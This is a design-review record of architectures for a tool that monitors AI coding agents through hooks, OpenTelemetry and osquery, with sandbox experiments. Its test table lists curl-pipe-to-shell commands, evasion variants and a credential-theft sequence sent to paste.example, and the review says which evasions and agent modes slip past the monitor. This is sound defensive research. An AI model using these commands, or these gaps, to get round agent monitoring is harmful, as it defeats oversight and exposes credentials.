> **Historical design record.** Red-team review of design v0, alternative-architectures lens (a principal engineer arguing the top-level design is wrong; the thesis, A5, A8, A17, A21, A30).
>
> - Written on 2026-11-11, during design (the file was last modified 2026-11-11 17:15 UTC on the build machine; it says "Date 2026-11-11").
> - Written under the working name **spoor** (binary `spoor`, rule ids `SPR-...`, osquery tables `spoor_*`, environment prefix `SPOOR_`). The project was renamed hawkbell on 2026-11-12 (commit d261f98), and those became `hawkbell`, `HB-...`, `hawkbell_*` and `HAWKBELL_`.
> - Findings, numbers, plans and file names describe the design, the prototypes and the sources as they were then, not the release. For what the release does, read [docs/ASSUMPTIONS.md](../docs/ASSUMPTIONS.md) and [docs/LIMITATIONS.md](../docs/LIMITATIONS.md).
> - Local paths (`/home/user/...`, `/root/...`, `/tmp/claude-0/...`, `$S/...` for the session scratch directory, and work-directory variables the text defines) name directories on the build machine, a Linux sandbox VM. The scripts, outputs and downloaded sources in them are not in this repository.
> - Redactions, each marked `[redacted: <reason>]` in the text: the session id in the scratch directory path (1 place).
> - Below the line the text is the original, unchanged except for the redactions listed. Other records cite these files by line number; such a number counts from the original's first line, which is line 12 of this file.

---

# Red team: alternative architectures vs design v0 ("spoor")

Lens: alt-architectures. Reviewer persona: principal engineer who thinks the v0 top-level shape is wrong.
Date 2026-11-11. Experiment files: `/tmp/claude-0/-home-user/[redacted: session id]/scratchpad/redteam/alt-arch/` (e1 = Fluent Bit Lua detection, e2 = OTLP into Fluent Bit, e3 = osquery evented tables + polling + extension lifetime, docs = Claude Code docs fetched today).

Legend: RUN = executed here and output observed. DOC = primary source read today. REP = research report in `scratchpad/research/`. EST = my arithmetic on top of RUN/REP numbers.

## 0. Final verdict

HYBRID. Keep v0's endpoint binary, hooks, transcript tail and on-endpoint rule engine. Neither alternative can replace it (section 4 and 5). But v0 is wrong in five top-level places, each fixed by a graft from one alternative:

1. The "three independent surfaces" are not independent. Hooks and transcripts are both written by the agent; the third (process polling) saw 7 of 120 child processes at a 1 s interval. Graft from ALT-2: ingest exec ground truth from osquery's evented tables into the correlator (tail the local osquery results log), and demote the poller to agent-presence inventory.
2. v0 has no native OpenTelemetry source at all, although the research recommended it and numbat, Agent Beacon and Agentmetry all ship OTLP ingest. Graft from ALT-1: OTLP logs as a first-class source (receiver in `spoor run`, and a tested Fluent Bit `opentelemetry` input + Lua normalizer for hosts with no binary).
3. Never host the daemon inside the osquery extension (A17). The extension process died 3 s after osqueryd was killed.
4. Ship ALT-1 as a real "no binary" rung (Fleet tables + managed OTel pinned to Fluent Bit + a lite rule pack), because it is the only thing a Fleet + Fluent Bit shop can turn on in hours, and it is the only coverage for hosts where a root daemon will never be approved.
5. Decouple the rule engine from the endpoint: the same engine must run as a pipeline stage over NDJSON, and detections must also be reachable through Fleet's own log path, because "Fluent Bit on every laptop" is an unstated assumption.

## 1. The two alternatives, concretely

### ALT-1 "no custom daemon, no custom hooks"
- Inventory/posture: fleetd `ai_tools`, `mcp_listening_servers` (fleetd >= 1.59), core tables; GitOps labels/policies/reports. (REP fleet.md s3, s6)
- Sessions: fleetd `ai_agent_sessions` (scheduled, cached) and `ai_agent_session_messages` (on demand) from fleetd 1.64 (unreleased). (REP fleet.md s3; source comment read today, see 3.6)
- Activity: agents' native OTel pinned by managed settings to a local Fluent Bit `opentelemetry` input (Claude Code logs, Codex logs, Gemini logs; Copilot JSON-lines file exporter tailed). (REP agent-surfaces-a.md lines 58, 80, 106, 120)
- Detection: Fluent Bit Lua processor on the endpoint for per-event and per-session rules; Sigma rules in the SIEM; Fleet policies for posture.
- Transport: Fluent Bit outputs; or osquery TLS logger -> Fleet log destination.

### ALT-2 "ground truth first"
- Primary sensor: process exec (+ file, socket) from the kernel: Linux eBPF or audit, macOS Endpoint Security, Windows ETW. Practical open-source form: osquery `bpf_process_events` / `process_events`, `es_process_events`, `process_etw_events`. Optional LLM/MCP gateway for payloads.
- Hooks/transcripts are enrichment: they give session, prompt and tool semantics to exec events attributed by process lineage.
- Detection: lineage-scoped rules (descendant of an agent process executed X, opened secret path Y, connected to host Z).

## 2. Comparison

| | v0 | ALT-1 | ALT-2 |
|---|---|---|---|
| Catches that v0 misses | n/a | Agent-internal signals no hook or transcript carries: `hook_execution_start/complete`, `tool_decision.source`, `permission_mode_changed`, `managed_settings_resolved`, `mcp_server_connection` (REP agent-surfaces-a.md:58). Works with zero new binary. | Effects instead of intent: what `python build.py` actually opened and connected to; ms-lived children (5/5 captured, RUN 3.3); hookless agents (`--bare`); agents not in the catalog. |
| Cannot do | see findings | Pre-execution decision (OTel `tool_result` is "Logged when a tool completes execution", DOC). Shell AST features (RUN 3.1: 3 of 5 evasions missed, 1 FP). Cursor (no native OTel, REP). Copilot logs (traces/metrics only, REP). Long inputs: `tool_input` "values over 512 characters are truncated ... bounded to ~4 K" (DOC monitoring-usage.md:847). Durable delivery (OTel SDK batch, default 5000 ms, no disk queue; DOC line 123). Transcript streaming through osquery (3.6). | Session, prompt, MCP-over-stdio and in-process tools (Read/Edit/WebFetch run inside the agent process). Unprivileged containers, Codespaces, hosted CI. Attribution of intent. Blocking. |
| Linux | binary + service | fleetd + Fluent Bit | osquery audit (single netlink consumer) or BPF. BPF publisher failed here: "Failed to setup the memory lock limits" (RUN 3.3). |
| macOS | pkg, notarization, root daemon | fleetd + Fluent Bit pkg + config profile | ES needs Apple entitlement + Full Disk Access via MDM (REP fleet.md s2 table). Only osquery's signed build is realistic for an OSS project. |
| Windows | MSI, code signing, AV exclusions | fleetd + Fluent Bit MSI + registry policy | `process_etw_events` flag (REP fleet.md s2). |
| Containers | DaemonSet hostPID / in-container hook | OTLP to node Fluent Bit works with no privileges | Privileged DaemonSet only; nothing in Codespaces/CI. |
| Volume at 10,000 devs (EST) | ~67k sessions/day x 31.2 tool calls (REP adr-paper.md:34,148: 200k sessions/day on 30k endpoints; adr-detection.md:104) x ~2.2 events = ~4.6M events/day, 53/s fleet-wide; 352 B per synthetic event (RUN) so 1.6 GB/day, 3-5 GB/day with full envelope | Same order as v0 (one `tool_decision` + one `tool_result` per call plus `api_request`) | 9.2 exec/s x 412 B measured on this busy sandbox (RUN 3.3) = 327 MB/day/host if sustained; at 10% duty 33 MB/day/host = ~330 GB/day unfiltered, 70-100x v0, unless lineage-filtered on the endpoint (which needs a local correlator, i.e. a daemon) |
| Central compute | none required | one Fluent Bit core: 200k records through Lua detection in <= 5.2 s wall (RUN 3.1), so a whole day of the fleet in ~2 minutes | SIEM joins over exec stream |
| Time to first value, Fleet + Fluent Bit shop | days to weeks: package, sign, notarize, security review of a root daemon, hook rollout | hours: GitOps bundle + one managed-settings profile + one Fluent Bit input | weeks to months: flags restart orbit (REP fleet.md pitfalls), FDA profile, auditd conflicts, watchdog tuning (Fleet raises to 350 MB / 130%, REP) |

## 3. Experiments

### 3.1 Pipeline-side detection in Fluent Bit Lua (ALT-1 viability; A8, A21) — RUN
Files: `alt-arch/e1/detect.lua`, `events.ndjson`, `fb.yaml`.
Pipeline: `tail` (JSON parser) -> `lua` filter (stateless curl-pipe-shell rule + per-session trifecta state in a Lua table) -> `rewrite_tag` (`$kind ^detection$ spoor.detection false`) -> stdout.
Command: `docker run --rm --network host -v $D/e1:/w fluent/fluent-bit:latest /fluent-bit/bin/fluent-bit -c /w/fb.yaml`

Input (10 hook-shaped events) and result:

| id | command / action | expected | Lua result |
|---|---|---|---|
| e1 | `curl -fsSL https://get.example.sh/install \| bash` | detect | detected |
| e2 | `bash -c "$(curl -fsSL https://x.example/i.sh)"` | detect | detected |
| e3 | `c\url -s https://x.example/i.sh \| ba''sh` | detect | MISSED |
| e4 | `echo <base64 of curl..\|bash> \| base64 -d \| sh` | detect | MISSED |
| e5 | `U=https://..; curl -s $U -o /tmp/a; sh /tmp/a` | detect | MISSED |
| e6 | `git log --oneline \| head -5  # docs say: curl https://x \| sh is unsafe` | benign | FALSE POSITIVE |
| e7,e8,e9 (session s2) | WebFetch evil.example, Read ~/.aws/credentials, curl POST paste.example | trifecta | detected: `seq.lethal_trifecta` "untrusted input -> secret read -> egress to paste.example" |
| e10 (session s3) | same curl POST alone | none | none |

Output lines (trimmed):
```
{"ref":"e1","detection":{"rule_id":"exec.download_pipe_shell","severity":"high","engine":"flb-lua"},"kind":"detection","session":{"id":"s1"}}
{"ref":"e2", ... "exec.download_pipe_shell" ...}
{"ref":"e6", ... "exec.download_pipe_shell" ...}        <- false positive on a shell comment
{"ref":"e9","detection":{"rule_id":"seq.lethal_trifecta","severity":"critical", ...},"session":{"id":"s2"}}
```
Throughput: 200,000 synthetic events (70,415,913 bytes, 352 B each, 300 sessions), `exit_on_eof`, `counter` outputs:
```
fb-big-nolua.yaml wall=2.210s records_counted=200000
fb-big.yaml       wall=5.192s records_counted=211911   (200000 activity + 11911 detections; an earlier run took 4.204s)
docker startup baseline=0.185s
```
Reading: stateless and simple stateful rules in the pipeline are viable and fast (>= 38k events/s on one thread, including shutdown grace). They are not equivalent to v0's engine: no shell AST, so quoting, base64 and split download-then-exec all evade and a comment false-positives. Session state lives in the Lua VM, so it is lost on Fluent Bit restart or hot reload (not run; follows from state being a Lua global table). Lua patterns have no alternation; rules are code, not data.

### 3.2 Native OTel into Fluent Bit with no custom binary (ALT-1) — RUN
Files: `alt-arch/e2/otel.lua`, `fb.yaml`, `payload.json`.
`opentelemetry` input on 127.0.0.1:43918 with a `lua` processor using the 5-argument signature `(tag, ts, group, metadata, record)`; reads `metadata.otlp.attributes` and `group.resource.attributes`, emits a normalized event, `file` output.
Payload: two OTLP/HTTP JSON log records shaped from the Claude Code docs (`claude_code.tool_result`, attributes `event.name, session.id, tool_name, tool_use_id, tool_parameters` as a JSON string with `full_command`); the second record has no `tool_parameters` (what you get without `OTEL_LOG_TOOL_DETAILS=1`). The payload is synthetic, built from the documented schema, not captured from a real Claude Code process.
```
otlp http=201
{"v":1,"kind":"activity","source":"otel","session":{"id":"0f3c-s1"},"agent":{"name":"claude-code","version":"2.1.290"},"detection":{"severity":"high","rule_id":"exec.download_pipe_shell","engine":"flb-lua-otel"},"type":"tool_result","tool":{"name":"Bash","use_id":"toolu_01ABC"},"target":{"command":"curl -fsSL https://get.example.sh/install | bash"}, ...}
{"v":1,"kind":"activity","source":"otel","type":"tool_result","tool":{"name":"Bash","use_id":"toolu_01ABD"},"session":{"id":"0f3c-s1"},"agent":{"name":"claude-code","version":"2.1.290"}}
```
Reading: Fluent Bit alone can receive, normalize and detect on agent-native OTel, and lifting attributes into the record in Lua fixes the "file output drops OTLP attributes" problem noted in REP fluentbit.md s3. Without the `OTEL_LOG_TOOL_DETAILS` gate there is no command to match.

### 3.3 Exec ground truth: osquery evented tables vs polling (A5, ALT-2) — RUN
Private osqueryd 5.19.0 (copied from `/proc/<enrolled pid>/exe`, own db/pidfile/socket/log dir; the enrolled host was not touched). Note: `$S/dl/` named in ENV.md no longer exists on disk; the enrolled osqueryd is running from a deleted file.
Flags: `--disable_events=false --enable_bpf_events=true --disable_audit=false --audit_allow_process_events=true --audit_allow_config=true --disable_watchdog=true --logger_plugin=filesystem`, schedule: `select pid,parent,path,cmdline,time from process_events` and the same for `bpf_process_events`, interval 5.
Evented tables registered on this Linux build: `apparmor_events, bpf_process_events, bpf_socket_events, file_events, hardware_events, process_events, process_file_events, seccomp_events, selinux_events, socket_events, syslog_events, user_events, yara_events`.
```
eventfactory.cpp:156] Event publisher not enabled: BPFEventPublisher: Failed to setup the memory lock limits. The BPF tables may not work correctly.
auditdnetlink.cpp:400] Enabling audit rules for the process_events (execve, execveat) table
{'active': '1', 'events': '0', 'name': 'bpf_process_events', 'publisher': 'BPFEventPublisher', ...}     <- "active" yet delivers nothing
aud_proc {'cmdline': 'sh -c echo marker-rtalt-1 | cat > /dev/null', 'parent': '11545', 'path': '/usr/bin/dash', 'pid': '11935', ...}
marker sh -c events: 5 of 5; exec events 211 span_s 23 avg_bytes_per_event 412
auditdnetlink.cpp:623] Uninstalling the audit rules we have installed / Restoring the default configuration for the audit service
```
So audit `process_events` captured 5 of 5 millisecond-lived processes with pid, parent and full cmdline, and they landed in `osqueryd.results.log` (filesystem logger) within one 5 s interval. BPF did not work in this VM (root, BTF present, kernel 6.18) and `osquery_events` still said `active=1`.
Flake: a later run started about 2 s after I SIGKILLed a previous audit-enabled instance logged zero `process_events` rows in 25 s, with no error at default verbosity. A third run captured again. Not root-caused; the likely cause is audit ownership not being released cleanly. It shows the ground-truth sensor can deliver nothing silently.
Inconclusive: an ad hoc `select ... from process_events` through `osqueryd -S --connect <socket>` 2 s after the event returned `[]` while the scheduled query logged the same event seconds later. I do not claim an extension can pull evented rows over the socket; tailing the results log is the path I verified.

Polling comparison (`alt-arch/e3/poll.py`: a /proc scanner thread while spawning 100 `sh -c "echo .. | cat"` and 20 processes living 0.3 s):
```
poll_interval=1.0s  spawned=120 distinct_pids_seen=7
poll_interval=0.25s spawned=120 distinct_pids_seen=20     (all twenty 0.3 s ones, none of the 100 short ones)
```

### 3.4 Daemon hosted in the osquery extension (A17) — RUN
Private osqueryd with `--extensions_autoload` pointing at a copy of the sandbox's `probe.ext` (osquery-go).
```
osqueryd=25221 ext=25224 ext_ppid=25221
kill -9 25221
extension process exited 3s after osqueryd died
```
The extension is a child of osqueryd and exits when the manager socket goes away. Anything hosted in it (hook socket, tailers, session state in memory) goes down with every osqueryd restart.

### 3.5 Claude Code docs fetched today (DOC, `alt-arch/docs/*.md` from code.claude.com)
- headless.md:37-73: `--bare` skips "auto-discovery of hooks, skills, ... MCP servers"; "Hooks still don't run in bare mode when you pass them with `--settings`, or in ... a plugin you load with a flag. Don't use bare mode for a run that needs them."; "`--bare` is the recommended mode for scripted and SDK calls, and will become the default for `-p` in a future release."
- cli-reference.md:127: `--safe-mode`: "Managed settings policy still applies, including policy-configured hooks". No equivalent sentence exists for `--bare`; whether managed-tier hooks run under `--bare` is not stated, and I did not test it (no Claude Code binary used here).
- monitoring-usage.md:73-80: managed settings lock the OTLP endpoint and remove developer-set endpoints; exporter selectors must also be pinned or a developer can set a signal to `none`.
- monitoring-usage.md:71: `OTEL_*` is not passed to subprocesses.
- monitoring-usage.md:818: `tool_result` "Logged when a tool completes execution. Not emitted if the tool call was rejected".
- monitoring-usage.md:841-847: `tool_parameters` (Bash: `bash_command`, `full_command`, ...) and `tool_input` only with `OTEL_LOG_TOOL_DETAILS=1`; `tool_input` "Individual values over 512 characters are truncated, and the full payload is bounded to ~4 K characters".
- monitoring-usage.md:123: `OTEL_LOGS_EXPORT_INTERVAL` default 5000 ms.

### 3.6 Fleet's transcript tables (source read, /home/user/fleetdm/fleet/orbit/pkg/table/ai_agent_sessions)
`tables.go:1-9`: "ai_agent_sessions: one row of metadata per session, cheap enough to schedule (transcripts are parsed once and cached while unchanged); ai_agent_session_messages: the conversation itself, one row per content block, for on-demand queries. Results are capped at about 1 MiB". `cache.go`: cache key is the whole session; a changed size/mtime re-parses the whole file. So the message table is not an event stream, and an active session is fully re-read on each scheduled run. Fleet reports keep only the latest result per host and drop results over 512 KiB (REP fleet.md s10).

## 4. Why ALT-1 cannot replace v0 (tried, failed)
- No pre-execution point: OTel `tool_result` is post-completion; guard mode and "detect before the credential leaves" need the hook.
- Coverage: Cursor has no native OTel, Copilot has no log signal (REP agent-surfaces-a.md:8,31).
- Truncation at 512 chars per value in `tool_input` gives a padding evasion; `full_command` truncation is not documented either way.
- No shell AST in Lua: 3 of 5 trivial variants missed, 1 false positive (3.1).
- Transcript streaming through osquery needs a custom extension with byte-offset checkpoints and its own state, which is a daemon under another name, and that process dies with osqueryd (3.4).
- OTel export has no durable queue; a stopped collector loses events silently, where v0's spool does not.

## 5. Why ALT-2 cannot be primary (tried, failed)
- The sensor is not available everywhere: BPF publisher failed here; audit netlink is single-consumer; macOS ES needs an Apple entitlement; unprivileged containers and hosted CI get nothing.
- No semantics: exec events cannot say which prompt or which fetched page caused the action; MCP stdio and in-process tools are invisible as exec.
- Volume is 70-100x unless lineage-filtered on the endpoint, which requires the local correlator v0 already has.
- Silent failure modes exist (3.3 flake; `active=1` with zero events).

## 6. Findings (most damaging first; also returned in the structured result)
1. THESIS: the three surfaces are not independent; the correlator never sees exec ground truth. Broken.
2. A17: daemon inside the extension. Broken.
3. THESIS: native OTel is missing as a source. Broken (as a surface selection).
4. THESIS (hooks as primary, A3): `--bare` is documented to become the default for `-p`. Weakened.
5. A30 / unstated: Fluent Bit on every endpoint; no path through Fleet's own log pipeline. Weakened.
6. THESIS: the engine exists only inside the endpoint binary. Weakened.
7. A5: polling monitor value. Weakened (7/120 at 1 s).
8. A21: the cost argument for edge detection. Weakened.
9. THESIS: no payload vantage for MCP and model traffic (gateway graft). Weakened.
10. A8: code-level features vs pipeline rules. Holds.
11. THESIS vs ALT-1 as a full replacement. Holds.
12. THESIS vs ALT-2 as primary. Holds.

## 7. Limits of this review
- OTLP payload in 3.2 is synthetic. No real Claude Code, Codex or Gemini process was run.
- macOS and Windows claims come from the research reports, not from runs.
- Volume numbers at 10,000 developers are estimates from Uber's public session counts and this sandbox's exec rate; real exec rates on laptops were not measured.
- I did not test managed-tier hooks under `--bare`, Fluent Bit restart state loss, or `events_optimize` effects on lineage joins.
